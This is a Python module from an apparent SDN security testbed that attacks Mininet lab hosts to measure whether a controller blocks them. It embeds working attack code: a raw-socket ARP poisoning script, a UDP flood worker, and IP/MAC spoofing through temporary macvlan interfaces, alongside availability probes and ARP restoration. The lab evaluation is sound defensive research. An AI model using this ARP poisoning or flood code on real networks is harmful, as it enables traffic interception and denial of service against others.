from __future__ import annotations

import ipaddress
import json
import os
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

try:
    from dotenv import load_dotenv
except ImportError:  # pragma: no cover - dependency is checked by preflight
    def load_dotenv(*_args: Any, **_kwargs: Any) -> bool:
        return False

from .base_attack import AttackConfig, AttackResult
from config.experiment_protocol import (
    SCENARIO_SPECS,
    DISPLAY_SCENARIO_ORDER,
    AVAILABILITY_DEGRADATION_MARGIN,
    CONTROL_PROBE_COUNT,
    MAX_RATE_ACHIEVEMENT_PERCENT,
    MIN_CONTROL_AVAILABILITY,
    MIN_RATE_ACHIEVEMENT_PERCENT,
    PROTOCOL_ID,
    PROTECTED_RESOURCE_TEXT,
    protocol_parameter_errors,
)
from config.runtime_security import strong_secret_or_none


PROJECT_ROOT = Path(__file__).resolve().parents[1]
load_dotenv(PROJECT_ROOT / ".env")


MN_INFO_PATH = "/tmp/sdnmfa_mn.json"
SENSITIVE_TEXT = PROTECTED_RESOURCE_TEXT
GOOD_NEIGHBOR_STATES = {"REACHABLE", "STALE", "DELAY", "PROBE", "PERMANENT", "NOARP"}
POISONABLE_NEIGHBOR_STATES = {"REACHABLE", "STALE", "DELAY", "PROBE"}
NEIGHBOR_MAC_PATTERN = re.compile(r"(?:[0-9a-f]{2}:){5}[0-9a-f]{2}")
ARP_VERIFY_ATTEMPTS = 20
ARP_VERIFY_INTERVAL_SECONDS = 0.1


FLOOD_WORKER_CODE = r"""
import json
import os
import socket
import time

destination = os.environ["SDNMFA_DST"]
port = int(os.environ["SDNMFA_PORT"])
duration = float(os.environ["SDNMFA_DURATION"])
rate = float(os.environ["SDNMFA_RATE"])
payload_size = int(os.environ["SDNMFA_PAYLOAD"])
start_at = float(os.environ["SDNMFA_START_AT"])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = b"x" * payload_size
address = (destination, port)
packets = 0
byte_count = 0
errors = 0

while time.time() < start_at:
    time.sleep(0.001)

started = time.perf_counter()
deadline = started + duration
next_send = started
interval = (1.0 / rate) if rate > 0 else 0.0

while time.perf_counter() < deadline:
    try:
        sent = sock.sendto(payload, address)
        packets += 1
        byte_count += int(sent)
    except OSError:
        errors += 1

    if interval > 0:
        next_send += interval
        remaining = next_send - time.perf_counter()
        if remaining > 0:
            time.sleep(remaining)

elapsed = max(0.000001, time.perf_counter() - started)
sock.close()
print(json.dumps({
    "packets_sent": packets,
    "bytes_sent": byte_count,
    "send_errors": errors,
    "duration_seconds": elapsed,
    "actual_rate_pps": packets / elapsed,
}, sort_keys=True))
"""


FLOOD_RECEIVER_CODE = r"""
import json
import os
import socket
import time

port = int(os.environ["SDNMFA_PORT"])
duration = float(os.environ["SDNMFA_DURATION"])
start_at = float(os.environ["SDNMFA_START_AT"])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", port))
sock.settimeout(0.2)

while time.time() < start_at:
    time.sleep(0.001)

started = time.perf_counter()
deadline = started + duration
packets = 0
byte_count = 0

while time.perf_counter() < deadline:
    try:
        payload, _ = sock.recvfrom(65535)
        packets += 1
        byte_count += len(payload)
    except socket.timeout:
        continue

elapsed = max(0.000001, time.perf_counter() - started)
sock.close()
print(json.dumps({
    "packets_received": packets,
    "bytes_received": byte_count,
    "duration_seconds": elapsed,
    "actual_receive_rate_pps": packets / elapsed,
}, sort_keys=True))
"""


HTTP_ATTEMPT_CODE = r"""
import concurrent.futures
import json
import os
import socket
import time

destination = os.environ["SDNMFA_DST"]
port = int(os.environ["SDNMFA_PORT"])
path = os.environ["SDNMFA_PATH"]
expected = os.environ["SDNMFA_EXPECTED"].encode("utf-8")
count = int(os.environ["SDNMFA_COUNT"])
rate = float(os.environ["SDNMFA_RATE"])
start_at = float(os.environ["SDNMFA_START_AT"])

def one(index):
    scheduled = start_at + (index / rate if rate > 0 else 0.0)
    while time.time() < scheduled:
        time.sleep(0.001)
    started = time.perf_counter()
    status = 0
    body = b""
    timed_out = False
    error = None
    try:
        sock = socket.create_connection((destination, port), timeout=1.2)
        sock.settimeout(1.2)
        request = (
            "GET %s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n"
            % (path, destination)
        ).encode("ascii")
        sock.sendall(request)
        chunks = []
        while sum(len(item) for item in chunks) < 65536:
            chunk = sock.recv(8192)
            if not chunk:
                break
            chunks.append(chunk)
        sock.close()
        response = b"".join(chunks)
        first = response.split(b"\r\n", 1)[0].split()
        if len(first) >= 2 and first[1].isdigit():
            status = int(first[1])
        body = response.split(b"\r\n\r\n", 1)[-1]
    except socket.timeout:
        timed_out = True
        error = "timeout"
    except OSError as exc:
        error = str(exc)
    return {
        "sample_index": index + 1,
        "http_status": status,
        "accessible": bool(status == 200 and expected in body),
        "timed_out": timed_out,
        "return_code": 28 if timed_out else (0 if status else 1),
        "elapsed_ms": (time.perf_counter() - started) * 1000.0,
        "error": error,
    }

started = time.perf_counter()
with concurrent.futures.ThreadPoolExecutor(max_workers=min(32, count)) as pool:
    samples = list(pool.map(one, range(count)))
elapsed = max(0.000001, time.perf_counter() - started)
print(json.dumps({
    "samples": samples,
    "elapsed_seconds": elapsed,
    "actual_request_rate": count / elapsed,
}, sort_keys=True))
"""


ARP_POISON_CODE = r"""
import ipaddress
import json
import os
import signal
import socket
import struct
import time

interface = os.environ["SDNMFA_INTERFACE"]
attacker_mac_text = os.environ["SDNMFA_ATTACKER_MAC"]
targets = json.loads(os.environ["SDNMFA_ARP_TARGETS"])
duration = float(os.environ["SDNMFA_DURATION"])

def mac_bytes(value):
    return bytes(int(part, 16) for part in value.split(":"))

attacker_mac = mac_bytes(attacker_mac_text)
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
sock.bind((interface, 0))
stop_requested = False

def request_stop(_signum, _frame):
    global stop_requested
    stop_requested = True

signal.signal(signal.SIGTERM, request_stop)
signal.signal(signal.SIGINT, request_stop)
started = time.monotonic()
deadline = time.monotonic() + duration
sent = 0
sent_by_target = {target["target_ip"]: 0 for target in targets}
while time.monotonic() < deadline and not stop_requested:
    for target in targets:
        target_mac = mac_bytes(target["target_mac"])
        ethernet = target_mac + attacker_mac + b"\x08\x06"
        arp = struct.pack(
            "!HHBBH6s4s6s4s",
            1,
            0x0800,
            6,
            4,
            2,
            attacker_mac,
            ipaddress.IPv4Address(target["spoof_ip"]).packed,
            target_mac,
            ipaddress.IPv4Address(target["target_ip"]).packed,
        )
        sock.send(ethernet + arp)
        sent += 1
        sent_by_target[target["target_ip"]] += 1
    time.sleep(0.25)
sock.close()
print(json.dumps({
    "arp_replies_sent": sent,
    "arp_replies_by_target": sent_by_target,
    "elapsed_seconds": max(0.0, time.monotonic() - started),
    "terminated_by_parent": stop_requested,
}, sort_keys=True))
"""


def _read_mn() -> Dict[str, Any]:
    if not os.path.exists(MN_INFO_PATH):
        raise RuntimeError("Mininet info not found. Start config/topology.py first.")
    with open(MN_INFO_PATH, "r", encoding="utf-8") as handle:
        data = json.load(handle)
    for key in ("h1", "h2", "h3", "h4", "h5", "sensitive", "network_control"):
        if key not in data:
            raise RuntimeError("Mininet context is incomplete: missing %s" % key)
    return data


def _mn_pid(mn: Dict[str, Any], host: str) -> int:
    return int(mn[host]["pid"])


def _run(argv: List[str], timeout: Optional[float] = None) -> Tuple[int, str]:
    completed = subprocess.run(
        argv,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=timeout,
        check=False,
    )
    return completed.returncode, completed.stdout


def _run_capture(
    argv: List[str], timeout: Optional[float] = None, env: Optional[Dict[str, str]] = None
) -> Dict[str, Any]:
    started = time.perf_counter()
    try:
        completed = subprocess.run(
            argv,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout,
            env=env,
            check=False,
        )
        return {
            "return_code": int(completed.returncode),
            "stdout": completed.stdout or "",
            "stderr": completed.stderr or "",
            "timed_out": False,
            "elapsed_ms": round((time.perf_counter() - started) * 1000.0, 3),
        }
    except subprocess.TimeoutExpired as exc:
        stdout = (
            exc.stdout.decode("utf-8", errors="replace")
            if isinstance(exc.stdout, bytes)
            else (exc.stdout or "")
        )
        stderr = (
            exc.stderr.decode("utf-8", errors="replace")
            if isinstance(exc.stderr, bytes)
            else (exc.stderr or "")
        )
        return {
            "return_code": 124,
            "stdout": stdout,
            "stderr": stderr,
            "timed_out": True,
            "elapsed_ms": round((time.perf_counter() - started) * 1000.0, 3),
        }


def _terminate_process(process: Any, label: str, timeout_s: float = 3.0) -> Tuple[str, str, Optional[str]]:
    """Stop a laboratory helper process and never leave it running after a task."""
    warning = None
    try:
        if process.poll() is None:
            process.terminate()
        try:
            stdout, stderr = process.communicate(timeout=timeout_s)
        except subprocess.TimeoutExpired:
            process.kill()
            stdout, stderr = process.communicate()
            warning = "%s required forced termination" % label
        return stdout or "", stderr or "", warning
    except Exception as exc:
        try:
            if process.poll() is None:
                process.kill()
            stdout, stderr = process.communicate(timeout=1.0)
        except Exception:
            stdout, stderr = "", ""
        return stdout or "", stderr or "", "%s cleanup failed: %s" % (label, exc)


def _controller_deny_evidence(
    since_epoch: float,
    src_ip: Optional[str] = None,
) -> Dict[str, Any]:
    """Fetch supplementary packet-denial evidence from the local Ryu app.

    A matching denial is required before a failed request can be classified as
    blocked. If evidence retrieval fails, the request remains non-evaluable.
    """
    token = strong_secret_or_none(os.getenv("CONTROLLER_API_TOKEN"))
    if token is None:
        return {
            "available": False,
            "count": 0,
            "events": [],
            "error": "controller_api_token_not_configured",
        }
    query: Dict[str, Any] = {
        "since": "%.6f" % max(0.0, float(since_epoch) - 0.05),
        "limit": 50,
    }
    if src_ip:
        query["src_ip"] = str(src_ip)
    url = "http://127.0.0.1:8080/sdnmfa/deny-events?%s" % urllib.parse.urlencode(query)
    request = urllib.request.Request(
        url,
        headers={"X-SDNMFA-Token": token, "Accept": "application/json"},
        method="GET",
    )
    try:
        with urllib.request.urlopen(request, timeout=2.0) as response:
            payload = json.loads(response.read().decode("utf-8") or "{}")
        events = payload.get("events") if isinstance(payload, dict) else []
        if not isinstance(events, list):
            events = []
        return {
            "available": True,
            "count": len(events),
            "events": [item for item in events if isinstance(item, dict)],
            "error": None,
        }
    except (urllib.error.URLError, OSError, ValueError, TypeError) as exc:
        return {
            "available": False,
            "count": 0,
            "events": [],
            "error": str(exc)[:300],
        }


def _ns(host_pid: int, command: str, timeout: Optional[float] = None) -> Tuple[int, str]:
    return _run(["mnexec", "-a", str(host_pid), "bash", "-lc", command], timeout=timeout)


def _ns_exec(
    host_pid: int,
    argv: List[str],
    timeout: Optional[float] = None,
    env: Optional[Dict[str, str]] = None,
) -> Dict[str, Any]:
    return _run_capture(["mnexec", "-a", str(host_pid)] + argv, timeout=timeout, env=env)


def _require_command(result: Dict[str, Any], description: str) -> None:
    if int(result.get("return_code", 1)) != 0:
        detail = str(result.get("stderr") or result.get("stdout") or "unknown error").strip()
        raise RuntimeError("%s failed: %s" % (description, detail[:300]))


def _get_iface(host_pid: int) -> str:
    rc, output = _ns(
        host_pid,
        "ip -o link show | awk -F': ' '{print $2}' | grep -v '^lo' | head -n 1 | cut -d'@' -f1",
        timeout=3,
    )
    iface = output.strip().splitlines()[0] if rc == 0 and output.strip() else ""
    if not iface:
        raise RuntimeError("Host interface could not be resolved for PID %s" % host_pid)
    return iface


def _get_ip(host_pid: int) -> str:
    rc, output = _ns(
        host_pid,
        "ip -o -4 addr show scope global | awk '{print $4}' | head -n 1",
        timeout=3,
    )
    value = output.strip().split("/")[0] if rc == 0 and output.strip() else ""
    if not value:
        raise RuntimeError("Host IPv4 address could not be resolved for PID %s" % host_pid)
    return value


def _get_mac(host_pid: int) -> str:
    iface = _get_iface(host_pid)
    result = _ns_exec(host_pid, ["cat", "/sys/class/net/%s/address" % iface], timeout=3)
    _require_command(result, "Read host MAC address")
    value = str(result["stdout"]).strip().lower()
    if not re.fullmatch(r"(?:[0-9a-f]{2}:){5}[0-9a-f]{2}", value):
        raise RuntimeError("Invalid MAC address returned for PID %s" % host_pid)
    return value


def _set_identity(host_pid: int, ip: Optional[str] = None, mac: Optional[str] = None) -> None:
    iface = _get_iface(host_pid)
    if mac:
        mac_value = str(mac).lower().strip()
        if not re.fullmatch(r"(?:[0-9a-f]{2}:){5}[0-9a-f]{2}", mac_value):
            raise ValueError("Invalid MAC address")
        _require_command(
            _ns_exec(host_pid, ["ip", "link", "set", "dev", iface, "down"], timeout=3),
            "Bring interface down",
        )
        _require_command(
            _ns_exec(host_pid, ["ip", "link", "set", "dev", iface, "address", mac_value], timeout=3),
            "Set MAC address",
        )
        _require_command(
            _ns_exec(host_pid, ["ip", "link", "set", "dev", iface, "up"], timeout=3),
            "Bring interface up",
        )
    if ip:
        ip_value = str(ipaddress.ip_address(str(ip).strip()))
        _require_command(
            _ns_exec(
                host_pid,
                ["ip", "-4", "addr", "flush", "dev", iface, "scope", "global"],
                timeout=3,
            ),
            "Flush IPv4 address",
        )
        _require_command(
            _ns_exec(host_pid, ["ip", "addr", "add", "%s/24" % ip_value, "dev", iface], timeout=3),
            "Set IPv4 address",
        )


def _suspend_ipv4(host_pid: int) -> str:
    """Remove a host's IPv4 address without changing its link state.

    Cycling a host-facing port forces the OVS STP bridge to reconverge in the
    partial-mesh profile. Address suspension prevents duplicate source IPs
    during a spoofing task while leaving the spanning tree untouched.
    """
    iface = _get_iface(host_pid)
    _require_command(
        _ns_exec(
            host_pid,
            ["ip", "-4", "addr", "flush", "dev", iface, "scope", "global"],
            timeout=3,
        ),
        "Suspend host IPv4 address",
    )
    observed = _ns_exec(
        host_pid,
        ["ip", "-o", "-4", "addr", "show", "dev", iface, "scope", "global"],
        timeout=3,
    )
    _require_command(observed, "Verify suspended host IPv4 address")
    if str(observed.get("stdout") or "").strip():
        raise RuntimeError("IPv4 address remained configured on %s" % iface)
    return iface


def _create_spoof_interface(
    host_pid: int, parent_iface: str, ip: str, mac: str
) -> str:
    """Create a short-lived macvlan identity without cycling the parent link."""
    spoof_iface = "sdnmfa-spoof0"
    ip_value = str(ipaddress.ip_address(str(ip).strip()))
    mac_value = str(mac).lower().strip()
    if not re.fullmatch(r"(?:[0-9a-f]{2}:){5}[0-9a-f]{2}", mac_value):
        raise ValueError("Invalid spoof MAC address")
    _require_command(
        _ns_exec(
            host_pid,
            [
                "ip", "link", "add", "link", parent_iface, "name", spoof_iface,
                "address", mac_value, "type", "macvlan", "mode", "bridge",
            ],
            timeout=3,
        ),
        "Create temporary spoof interface",
    )
    try:
        _require_command(
            _ns_exec(
                host_pid,
                ["ip", "-4", "addr", "add", "%s/24" % ip_value, "dev", spoof_iface],
                timeout=3,
            ),
            "Assign spoof IPv4 address",
        )
        _require_command(
            _ns_exec(
                host_pid,
                ["ip", "link", "set", "dev", spoof_iface, "up"],
                timeout=3,
            ),
            "Enable temporary spoof interface",
        )
    except Exception:
        _ns_exec(host_pid, ["ip", "link", "del", "dev", spoof_iface], timeout=3)
        raise
    return spoof_iface


def _delete_spoof_interface(host_pid: int, spoof_iface: str) -> None:
    _require_command(
        _ns_exec(host_pid, ["ip", "link", "del", "dev", spoof_iface], timeout=3),
        "Delete temporary spoof interface",
    )


def _curl_sensitive(
    host_pid: int,
    url: str,
    timeout_s: float = 2.0,
    expected_text: str = SENSITIVE_TEXT,
) -> Dict[str, Any]:
    marker = "__SDNMFA_HTTP__:"
    result = _ns_exec(
        host_pid,
        [
            "curl",
            "--max-time",
            str(float(timeout_s)),
            "--silent",
            "--show-error",
            "--output",
            "-",
            "--write-out",
            "\n%s%%{http_code}\n" % marker,
            "--",
            str(url),
        ],
        timeout=float(timeout_s) + 2.0,
    )
    stdout = str(result.get("stdout") or "")
    http_status = 0
    body = stdout
    marker_index = stdout.rfind(marker)
    if marker_index >= 0:
        body = stdout[:marker_index].rstrip()
        status_text = stdout[marker_index + len(marker):].strip().splitlines()[0]
        try:
            http_status = int(status_text)
        except (TypeError, ValueError):
            http_status = 0
    result.update(
        {
            "http_status": http_status,
            "body": body[:1000],
            "accessible": bool(
                result.get("return_code") == 0
                and http_status == 200
                and expected_text in body
            ),
        }
    )
    result.pop("stdout", None)
    return result


def _probe_series(
    host_pid: int,
    url: str,
    count: int,
    phase: str,
    timeout_s: float = 1.5,
    interval_s: float = 0.2,
    expected_text: str = SENSITIVE_TEXT,
) -> List[Dict[str, Any]]:
    samples = []
    for index in range(max(1, int(count))):
        sample = _curl_sensitive(
            host_pid,
            url,
            timeout_s=timeout_s,
            expected_text=expected_text,
        )
        sample["phase"] = phase
        sample["sample_index"] = index + 1
        sample["observed_monotonic"] = time.monotonic()
        samples.append(sample)
        if index + 1 < count and interval_s > 0:
            time.sleep(interval_s)
    return samples


def _http_attempt_series(host_pid: int, cfg: AttackConfig, url: str) -> Dict[str, Any]:
    """Generate a rate-controlled series of real TCP/HTTP attempts."""
    parsed_url = urllib.parse.urlparse(url)
    request_count = int(cfg.request_count or 1)
    start_at = time.time() + 0.35
    env = os.environ.copy()
    env.update(
        {
            "SDNMFA_DST": str(parsed_url.hostname or cfg.target_host),
            "SDNMFA_PORT": str(int(parsed_url.port or cfg.target_port)),
            "SDNMFA_PATH": str(parsed_url.path or "/"),
            "SDNMFA_EXPECTED": SENSITIVE_TEXT,
            "SDNMFA_COUNT": str(request_count),
            "SDNMFA_RATE": str(float(cfg.rate_pps)),
            "SDNMFA_START_AT": str(start_at),
        }
    )
    result = _ns_exec(
        host_pid,
        ["python3", "-c", HTTP_ATTEMPT_CODE],
        timeout=max(5.0, float(cfg.duration_s) + 4.0),
        env=env,
    )
    payload: Dict[str, Any] = {}
    for line in reversed(str(result.get("stdout") or "").splitlines()):
        try:
            candidate = json.loads(line)
        except (TypeError, ValueError):
            continue
        if isinstance(candidate, dict):
            payload = candidate
            break
    samples = payload.get("samples") if isinstance(payload.get("samples"), list) else []
    clean_samples = [item for item in samples if isinstance(item, dict)]
    success_count = sum(1 for item in clean_samples if item.get("accessible"))
    timed_out_count = sum(1 for item in clean_samples if item.get("timed_out"))
    elapsed_values = sorted(float(item.get("elapsed_ms", 0.0)) for item in clean_samples)
    p95_index = max(0, min(len(elapsed_values) - 1, int(round(0.95 * (len(elapsed_values) - 1))))) if elapsed_values else 0
    return {
        "accessible": success_count > 0,
        "attempt_count": len(clean_samples),
        "successful_attempts": success_count,
        "blocked_or_failed_attempts": len(clean_samples) - success_count,
        "timed_out_attempts": timed_out_count,
        "all_timed_out": bool(clean_samples) and timed_out_count == len(clean_samples),
        "actual_request_rate": payload.get("actual_request_rate"),
        "elapsed_seconds": payload.get("elapsed_seconds"),
        "latency_mean_ms": (
            round(sum(elapsed_values) / len(elapsed_values), 3) if elapsed_values else None
        ),
        "latency_p95_ms": round(elapsed_values[p95_index], 3) if elapsed_values else None,
        "samples": clean_samples,
        "return_code": int(result.get("return_code", 1)),
        "timed_out": bool(result.get("timed_out")),
        "stderr": str(result.get("stderr") or "")[:500],
        "http_status": max([int(item.get("http_status") or 0) for item in clean_samples] or [0]),
    }


def _refresh_controller_forwarding() -> Dict[str, Any]:
    """Clear stale learned paths while preserving the active authorization."""
    token = strong_secret_or_none(os.getenv("CONTROLLER_API_TOKEN"))
    if token is None:
        return {"ok": False, "error": "controller_api_token_not_configured"}
    request = urllib.request.Request(
        "http://127.0.0.1:8080/sdnmfa/refresh-forwarding",
        data=b"{}",
        headers={
            "Content-Type": "application/json",
            "X-SDNMFA-Token": token,
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=3.0) as response:
            payload = json.loads(response.read().decode("utf-8") or "{}")
        return payload if isinstance(payload, dict) else {"ok": False}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def _availability_rate(samples: List[Dict[str, Any]]) -> float:
    if not samples:
        return 0.0
    return sum(1 for item in samples if item.get("accessible")) / float(len(samples))


def _public_samples(samples: List[Dict[str, Any]], reference: float) -> List[Dict[str, Any]]:
    public = []
    for item in samples:
        clean = dict(item)
        observed = float(clean.pop("observed_monotonic", reference))
        clean["relative_time_s"] = round(observed - reference, 3)
        public.append(clean)
    return public


def _replace_neigh(
    host_pid: int, ip: str, mac: str, *, interface: Optional[str] = None
) -> None:
    """Install a deterministic neighbour entry inside a Mininet host."""
    iface = interface or _get_iface(host_pid)
    ip_value = str(ipaddress.ip_address(str(ip).strip()))
    mac_value = str(mac).lower().strip()
    if not re.fullmatch(r"(?:[0-9a-f]{2}:){5}[0-9a-f]{2}", mac_value):
        raise ValueError("Invalid neighbour MAC address")
    result = _ns_exec(
        host_pid,
        [
            "ip",
            "neigh",
            "replace",
            ip_value,
            "lladdr",
            mac_value,
            "nud",
            "permanent",
            "dev",
            iface,
        ],
        timeout=3,
    )
    _require_command(result, "Install deterministic neighbour entry")


def _flush_neigh(host_pid: int, ip: str) -> Dict[str, Any]:
    """Remove and verify one exact neighbour entry, including static states.

    ``ip neigh flush`` excludes ``PERMANENT`` and ``NOARP`` entries unless a
    NUD-state selector is supplied.  The shared preflight intentionally uses
    permanent mappings, so omitting ``nud all`` leaves an ARP entry that cannot
    be changed by the poisoning phase.
    """
    iface = _get_iface(host_pid)
    ip_value = str(ipaddress.ip_address(str(ip).strip()))
    result = _ns_exec(
        host_pid,
        ["ip", "neigh", "flush", "to", ip_value, "dev", iface, "nud", "all"],
        timeout=3,
    )
    _require_command(result, "Flush neighbour entry")
    observation = _neighbor_observation(host_pid, ip_value)
    if int(observation.get("return_code", 1)) != 0:
        raise RuntimeError(
            "Neighbour removal could not be verified for %s on %s"
            % (ip_value, iface)
        )
    if observation.get("mac") is not None or observation.get("state") != "MISSING":
        raise RuntimeError(
            "Neighbour removal left a residual entry for %s on %s: %s"
            % (ip_value, iface, observation.get("raw") or observation.get("state"))
        )
    return observation


def _neighbor_observation(host_pid: int, destination_ip: str) -> Dict[str, Any]:
    """Return a structured, exact observation of one ARP/ND cache entry."""
    iface = _get_iface(host_pid)
    ip_value = str(ipaddress.ip_address(str(destination_ip).strip()))
    result = _ns_exec(
        host_pid,
        ["ip", "neigh", "show", ip_value, "dev", iface],
        timeout=3,
    )
    raw = str(result.get("stdout") or "").strip()
    tokens = raw.lower().split()
    mac = None
    if "lladdr" in tokens:
        position = tokens.index("lladdr") + 1
        if position < len(tokens) and NEIGHBOR_MAC_PATTERN.fullmatch(tokens[position]):
            mac = tokens[position]
    state = "MISSING"
    upper_tokens = set(raw.upper().split())
    for candidate in GOOD_NEIGHBOR_STATES | {"INCOMPLETE", "FAILED"}:
        if candidate in upper_tokens:
            state = candidate
            break
    return {
        "destination_ip": ip_value,
        "interface": iface,
        "mac": mac,
        "state": state,
        "raw": raw[:500],
        "return_code": int(result.get("return_code", 1)),
        "stderr": str(result.get("stderr") or "")[:300] or None,
    }


def _observe_arp_pair(
    h1: int,
    h2: int,
    h1_ip: str,
    h1_mac: str,
    h2_ip: str,
    h2_mac: str,
    expected_h1_peer_mac: str,
    expected_h2_peer_mac: str,
    accepted_states: Optional[set[str]] = None,
) -> Dict[str, Any]:
    """Observe both directions and verify peer MAC addresses and NUD states."""
    h1_to_h2 = _neighbor_observation(h1, h2_ip)
    h2_to_h1 = _neighbor_observation(h2, h1_ip)
    expected_h1 = str(expected_h1_peer_mac).lower()
    expected_h2 = str(expected_h2_peer_mac).lower()
    allowed_states = {
        str(state).upper()
        for state in (GOOD_NEIGHBOR_STATES if accepted_states is None else accepted_states)
    }
    mapping_verified = bool(
        h1_to_h2.get("return_code") == 0
        and h2_to_h1.get("return_code") == 0
        and h1_to_h2.get("mac") == expected_h1
        and h2_to_h1.get("mac") == expected_h2
    )
    state_verified = bool(
        h1_to_h2.get("state") in allowed_states
        and h2_to_h1.get("state") in allowed_states
    )
    return {
        "h1": {"ip": str(h1_ip), "mac": str(h1_mac).lower()},
        "h2": {"ip": str(h2_ip), "mac": str(h2_mac).lower()},
        "h1_to_h2": h1_to_h2,
        "h2_to_h1": h2_to_h1,
        "expected_h1_peer_mac": expected_h1,
        "expected_h2_peer_mac": expected_h2,
        "accepted_neighbor_states": sorted(allowed_states),
        "mapping_verified": mapping_verified,
        "state_verified": state_verified,
        "verified": bool(mapping_verified and state_verified),
    }


def _wait_for_arp_pair(
    h1: int,
    h2: int,
    h1_ip: str,
    h1_mac: str,
    h2_ip: str,
    h2_mac: str,
    expected_h1_peer_mac: str,
    expected_h2_peer_mac: str,
    attempts: int = ARP_VERIFY_ATTEMPTS,
    interval_s: float = ARP_VERIFY_INTERVAL_SECONDS,
    accepted_states: Optional[set[str]] = None,
) -> Dict[str, Any]:
    """Poll a bidirectional ARP state to avoid a timing-dependent verdict."""
    observation: Dict[str, Any] = {"verified": False}
    started = time.monotonic()
    maximum = max(1, int(attempts))
    for attempt in range(1, maximum + 1):
        observation = _observe_arp_pair(
            h1,
            h2,
            h1_ip,
            h1_mac,
            h2_ip,
            h2_mac,
            expected_h1_peer_mac,
            expected_h2_peer_mac,
            accepted_states=accepted_states,
        )
        observation["verification_attempts"] = attempt
        if observation.get("verified"):
            break
        if attempt < maximum and interval_s > 0:
            time.sleep(float(interval_s))
    observation["verification_elapsed_ms"] = round(
        (time.monotonic() - started) * 1000.0, 3
    )
    return observation


def _prime_arp_pair(
    h1: int,
    h2: int,
    h1_ip: str,
    h1_mac: str,
    h2_ip: str,
    h2_mac: str,
) -> Dict[str, Any]:
    """Replace stale/permanent state with a verified dynamic baseline."""
    _flush_neigh(h1, h2_ip)
    _flush_neigh(h2, h1_ip)
    for source_pid, destination_ip in ((h1, h2_ip), (h2, h1_ip)):
        result = _ns_exec(
            source_pid,
            ["ping", "-n", "-c", "1", "-W", "1", str(destination_ip)],
            timeout=3,
        )
        _require_command(result, "Prime legitimate ARP neighbour state")
    return _wait_for_arp_pair(
        h1,
        h2,
        h1_ip,
        h1_mac,
        h2_ip,
        h2_mac,
        h2_mac,
        h1_mac,
        attempts=5,
        accepted_states=POISONABLE_NEIGHBOR_STATES,
    )


def _restore_arp_pair(
    h1: int,
    h2: int,
    h1_ip: str,
    h1_mac: str,
    h2_ip: str,
    h2_mac: str,
) -> Dict[str, Any]:
    """Restore legitimate bidirectional mappings and prove the restoration."""
    _replace_neigh(h1, h2_ip, h2_mac)
    _replace_neigh(h2, h1_ip, h1_mac)
    return _wait_for_arp_pair(
        h1,
        h2,
        h1_ip,
        h1_mac,
        h2_ip,
        h2_mac,
        h2_mac,
        h1_mac,
        attempts=3,
    )


def _network_diagnostics(
    host_pid: int, destination_ip: str, *, interface: Optional[str] = None
) -> Dict[str, Any]:
    iface = interface or _get_iface(host_pid)
    address = _ns_exec(host_pid, ["ip", "-o", "-4", "addr", "show", "dev", iface], timeout=3)
    route = _ns_exec(host_pid, ["ip", "-4", "route", "get", str(destination_ip)], timeout=3)
    neighbor = _ns_exec(host_pid, ["ip", "neigh", "show", str(destination_ip), "dev", iface], timeout=3)
    neighbor_text = str(neighbor.get("stdout") or "").strip()
    state = "UNKNOWN"
    upper_tokens = set(neighbor_text.upper().split())
    for candidate in GOOD_NEIGHBOR_STATES | {"INCOMPLETE", "FAILED"}:
        if candidate in upper_tokens:
            state = candidate
            break
    return {
        "interface": iface,
        "address": str(address.get("stdout") or "").strip()[:500],
        "route": str(route.get("stdout") or route.get("stderr") or "").strip()[:500],
        "neighbor": neighbor_text[:500],
        "neighbor_state": state,
    }


def _preflight(mn: Dict[str, Any]) -> Dict[str, Any]:
    h1 = _mn_pid(mn, "h1")
    h2 = _mn_pid(mn, "h2")
    protected_url = str(mn["sensitive"]["path"])
    local_url = "http://127.0.0.1:%s/%s" % (
        int(mn["sensitive"]["port"]),
        protected_url.rsplit("/", 1)[-1],
    )
    local_samples = _probe_series(
        h2, local_url, CONTROL_PROBE_COUNT, "local_service", timeout_s=1.0
    )
    legitimate_samples = _probe_series(
        h1, protected_url, CONTROL_PROBE_COUNT, "legitimate_before", timeout_s=1.5
    )
    control_url = str(mn["network_control"]["path"])
    control_text = str(mn["network_control"]["expected_text"])
    attack_source_control = _probe_series(
        _mn_pid(mn, "h3"),
        control_url,
        CONTROL_PROBE_COUNT,
        "attack_source_network_control",
        timeout_s=1.5,
        expected_text=control_text,
    )
    local_rate = _availability_rate(local_samples)
    legitimate_rate = _availability_rate(legitimate_samples)
    control_rate = _availability_rate(attack_source_control)
    valid = (
        local_rate >= MIN_CONTROL_AVAILABILITY
        and legitimate_rate >= MIN_CONTROL_AVAILABILITY
        and control_rate >= MIN_CONTROL_AVAILABILITY
    )
    error_type = None
    if local_rate < MIN_CONTROL_AVAILABILITY:
        error_type = "protected_service_unavailable"
    elif legitimate_rate < MIN_CONTROL_AVAILABILITY:
        error_type = "authorized_control_failed"
    elif control_rate < MIN_CONTROL_AVAILABILITY:
        error_type = "attack_source_network_control_failed"
    return {
        "valid": valid,
        "error_type": error_type,
        "probe_count": CONTROL_PROBE_COUNT,
        "minimum_rate": MIN_CONTROL_AVAILABILITY,
        "local_service_rate": round(local_rate, 4),
        "legitimate_rate": round(legitimate_rate, 4),
        "attack_source_control_rate": round(control_rate, 4),
        "local_service_samples": local_samples,
        "legitimate_samples": legitimate_samples,
        "attack_source_control_samples": attack_source_control,
    }


def _postflight(mn: Dict[str, Any]) -> Dict[str, Any]:
    samples = _probe_series(
        _mn_pid(mn, "h1"),
        str(mn["sensitive"]["path"]),
        CONTROL_PROBE_COUNT,
        "legitimate_after",
        timeout_s=1.5,
    )
    rate = _availability_rate(samples)
    return {
        "valid": rate >= MIN_CONTROL_AVAILABILITY,
        "rate": round(rate, 4),
        "minimum_rate": MIN_CONTROL_AVAILABILITY,
        "samples": samples,
    }


